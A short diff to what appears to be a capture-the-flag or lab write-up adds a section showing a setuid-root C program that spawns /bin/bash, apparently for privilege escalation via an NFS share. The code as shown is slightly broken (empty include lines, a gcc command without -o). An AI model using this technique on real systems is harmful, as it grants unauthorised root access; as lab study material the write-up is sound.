@@ -96,5 +96,25 @@ user.txt
 nfs>  
 ```
 
-\`\`
+## Shell
+
+We can obtain a shell via running the following code:
+
+```text
+cat << EOF >> shell.c
+> #include 
+> #include 
+> #include 
+> #include 
+> int main()
+> {
+> setuid(0);
+> system("/bin/bash");
+> return 0;
+> }
+> EOF
+
+gcc shell.c shell
+./shell
+```
 
